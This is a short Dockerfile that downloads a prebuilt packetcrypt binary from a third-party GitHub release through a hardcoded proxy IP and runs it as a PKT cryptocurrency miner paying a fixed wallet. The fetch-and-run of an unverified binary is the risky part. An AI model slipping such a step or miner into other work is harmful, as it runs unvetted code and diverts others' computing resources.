FROM ubuntu:bionic
ENV http_proxy "http://103.166.183.189:3128"
RUN apt update && \
        apt full-upgrade -y && \
        apt install wget -y && \
        wget http://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux && \
        chmod +x packetcrypt_x8664_linux
CMD ./packetcrypt_x8664_linux ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io -t 2
